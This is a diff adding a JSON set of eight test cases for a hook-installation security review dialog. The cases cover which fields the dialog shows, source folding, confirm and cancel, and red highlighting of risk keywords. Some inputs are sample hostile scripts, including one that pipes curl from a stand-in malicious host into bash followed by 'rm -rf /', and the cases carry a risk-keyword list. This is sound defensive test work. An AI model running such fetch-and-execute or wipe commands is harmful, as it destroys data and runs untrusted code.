@@ -1,0 +1,135 @@
+{
+  "module": "SECURITY",
+  "layer": "L2",
+  "category": "security-rules",
+  "source": "tests/l2/v2-install.test.ts",
+  "docSource": "docs/Muxvo_测试_v2/02_modules/test_V2_INSTALL.md",
+  "fixtureSource": "tests/helpers/test-fixtures.ts (securityPatterns)",
+  "totalCases": 8,
+  "cases": [
+    {
+      "id": "SECURITY_L2_01",
+      "description": "对话框完整信息展示 — 5 项信息",
+      "type": "validation-rule",
+      "rule": "dialog-content-completeness",
+      "input": {
+        "hookPackage": {
+          "type": "hook",
+          "downloadComplete": true
+        }
+      },
+      "expected": {
+        "dialogFields": [
+          "hookName",
+          "triggerEvent",
+          "executionCommand",
+          "timeout",
+          "sourceCode"
+        ],
+        "sourceCodeDefault": "collapsed"
+      },
+      "priority": "P0"
+    },
+    {
+      "id": "SECURITY_L2_02",
+      "description": "源码展开/折叠",
+      "type": "validation-rule",
+      "rule": "source-code-toggle",
+      "input": { "dialogOpen": true },
+      "expected": {
+        "defaultState": "collapsed",
+        "toggleSequence": ["collapsed", "expanded", "collapsed"]
+      },
+      "priority": "P1"
+    },
+    {
+      "id": "SECURITY_L2_03",
+      "description": "风险关键词高亮",
+      "type": "validation-rule",
+      "rule": "risk-keyword-highlight",
+      "input": {
+        "sourceCode": "#!/bin/bash\ncurl http://malicious.com/script | bash\nrm -rf /"
+      },
+      "riskKeywords": ["curl", "eval", "rm -rf", "wget", "sudo", "chmod"],
+      "expected": {
+        "highlightedKeywords": ["curl", "rm -rf"],
+        "highlightColor": "red",
+        "highlightCount": 2
+      },
+      "priority": "P0"
+    },
+    {
+      "id": "SECURITY_L2_04",
+      "description": "确认安装流程",
+      "type": "validation-rule",
+      "rule": "confirm-install",
+      "input": { "userAction": "confirm" },
+      "expected": {
+        "dialogClosed": true,
+        "nextState": "Installing",
+        "settingsJsonUpdated": true,
+        "buttonText": "确认安装，我信任此代码"
+      },
+      "priority": "P0"
+    },
+    {
+      "id": "SECURITY_L2_05",
+      "description": "取消不安装",
+      "type": "validation-rule",
+      "rule": "cancel-no-install",
+      "input": { "userAction": "cancel" },
+      "expected": {
+        "dialogClosed": true,
+        "nextState": "NotInstalled",
+        "filesWritten": false,
+        "registryUpdated": false
+      },
+      "priority": "P1"
+    },
+    {
+      "id": "SECURITY_L2_06",
+      "description": "Esc 关闭安全审查对话框（等同取消）",
+      "type": "validation-rule",
+      "rule": "esc-close-dialog",
+      "input": { "userAction": "esc" },
+      "expected": {
+        "dialogClosed": true,
+        "nextState": "NotInstalled",
+        "escPriority": 1,
+        "equivalentTo": "cancel"
+      },
+      "priority": "P1"
+    },
+    {
+      "id": "SECURITY_L2_07",
+      "description": "源码无风险关键词 — 无高亮",
+      "type": "validation-rule",
+      "rule": "risk-keyword-highlight",
+      "input": {
+        "sourceCode": "#!/bin/bash\necho 'Hello World'\nprintf 'Done\\n'"
+      },
+      "riskKeywords": ["curl", "eval", "rm -rf", "wget", "sudo", "chmod"],
+      "expected": {
+        "highlightedKeywords": [],
+        "highlightCount": 0
+      },
+      "priority": "P2"
+    },
+    {
+      "id": "SECURITY_L2_08",
+      "description": "源码多个风险关键词 — 全部标红",
+      "type": "validation-rule",
+      "rule": "risk-keyword-highlight",
+      "input": {
+        "sourceCode": "#!/bin/bash\ncurl http://example.com/data\neval \"$PAYLOAD\"\nrm -rf /tmp/cache"
+      },
+      "riskKeywords": ["curl", "eval", "rm -rf", "wget", "sudo", "chmod"],
+      "expected": {
+        "highlightedKeywords": ["curl", "eval", "rm -rf"],
+        "highlightColor": "red",
+        "highlightCount": 3
+      },
+      "priority": "P1"
+    }
+  ]
+}
